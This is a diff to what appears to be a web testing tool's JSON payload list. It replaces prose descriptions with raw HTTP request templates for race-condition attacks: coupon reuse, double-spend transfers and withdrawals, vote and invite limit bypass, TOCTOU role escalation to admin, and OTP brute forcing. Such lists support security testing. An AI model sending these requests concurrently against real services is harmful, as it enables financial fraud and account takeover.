@@ -4,34 +4,37 @@
     "coupon": {
       "description": "Race condition payloads targeting coupon/discount code single-use enforcement",
       "payloads": [
-        {"payload": "Send 50 simultaneous POST /apply-coupon requests with same coupon code before server can mark as used", "description": "Parallel coupon application race window", "waf_bypass": false},
-        {"payload": "Use Burp Turbo Intruder to send synchronized requests in the same TCP connection (HTTP/2 single-packet attack)", "description": "HTTP/2 single-packet race for atomic exploitation of coupon endpoint", "waf_bypass": false},
-        {"payload": "Time requests to arrive within 10ms of each other to exploit TOCTOU in coupon validation check", "description": "TOCTOU race between check-then-redeem flow", "waf_bypass": false}
+        {"payload": "POST /apply-coupon HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"code\":\"COUPON_CODE\"}", "description": "Apply coupon simultaneously — send 20+ times via test_race_condition", "waf_bypass": false},
+        {"payload": "POST /redeem HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"voucher\":\"SINGLE_USE\"}", "description": "Redeem single-use voucher — race to use multiple times", "waf_bypass": false}
       ]
     },
     "double_spend": {
       "description": "Race condition payloads targeting financial transaction double-spend",
       "payloads": [
-        {"payload": "Simultaneously submit two withdrawal requests for full account balance", "description": "Parallel withdrawal exceeding balance check race", "waf_bypass": false},
-        {"payload": "Race POST /transfer requests before debit is committed to database", "description": "Fund transfer race window exploitation", "waf_bypass": false},
-        {"payload": "Send concurrent gift card redemption requests before card is marked as spent", "description": "Gift card double redemption via race condition", "waf_bypass": false}
+        {"payload": "POST /transfer HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"amount\":100,\"to\":\"attacker_account\"}", "description": "Transfer full balance simultaneously — check if total transferred > balance", "waf_bypass": false},
+        {"payload": "POST /withdraw HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"amount\":100}", "description": "Withdraw full balance in parallel — race condition on balance check", "waf_bypass": false}
       ]
     },
     "limit_bypass": {
       "description": "Race conditions to bypass rate limits and per-user quotas",
       "payloads": [
-        {"payload": "Race POST /vote or POST /like requests to exceed one-vote-per-user limit", "description": "Vote/like limit bypass via concurrent requests", "waf_bypass": false},
-        {"payload": "Simultaneous API calls to exceed rate-limited endpoint before counter increments", "description": "Rate limit TOCTOU bypass with parallel requests", "waf_bypass": false},
-        {"payload": "Concurrent POST /redeem-reward to claim reward multiple times before deduction", "description": "Reward point double-redemption race", "waf_bypass": false},
-        {"payload": "Race PUT /upgrade-plan requests to get free tier upgraded before billing check", "description": "Plan upgrade race to bypass payment verification", "waf_bypass": false}
+        {"payload": "POST /invite/accept HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"code\":\"INVITE_CODE\"}", "description": "Accept invite code simultaneously — bypass single-use limit", "waf_bypass": false},
+        {"payload": "POST /vote HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"post_id\":\"123\"}", "description": "Like/vote simultaneously — inflate count beyond 1-per-user", "waf_bypass": false}
+      ]
+    },
+    "toctou": {
+      "description": "Time-of-check-to-time-of-use race conditions",
+      "payloads": [
+        {"payload": "POST /upload HTTP/1.1\r\nContent-Type: multipart/form-data\r\n\r\n[malicious_file]", "description": "Upload + immediate access race — access file before server validates/deletes", "waf_bypass": false},
+        {"payload": "POST /settings HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"role\":\"admin\"}", "description": "Update role during permission check window — TOCTOU on authorization", "waf_bypass": false}
       ]
     },
     "signup": {
       "description": "Race conditions in user registration and account creation flows",
       "payloads": [
-        {"payload": "Simultaneous POST /register with same email before uniqueness constraint is enforced", "description": "Duplicate account creation via registration race", "waf_bypass": false},
-        {"payload": "Race POST /verify-email with multiple OTP attempts before lockout counter increments", "description": "OTP brute force via race condition bypassing attempt limits", "waf_bypass": false},
-        {"payload": "Concurrent POST /claim-username before first-come assignment is committed", "description": "Username claim race condition", "waf_bypass": false}
+        {"payload": "POST /register HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"email\":\"user@target.com\",\"password\":\"test123\"}", "description": "Duplicate account creation — race uniqueness constraint on email", "waf_bypass": false},
+        {"payload": "POST /verify-email HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"otp\":\"123456\"}", "description": "OTP brute force via race — bypass attempt limits before counter increments", "waf_bypass": false},
+        {"payload": "POST /claim-username HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"username\":\"desired_name\"}", "description": "Username claim race — race first-come assignment before commit", "waf_bypass": false}
       ]
     }
   }
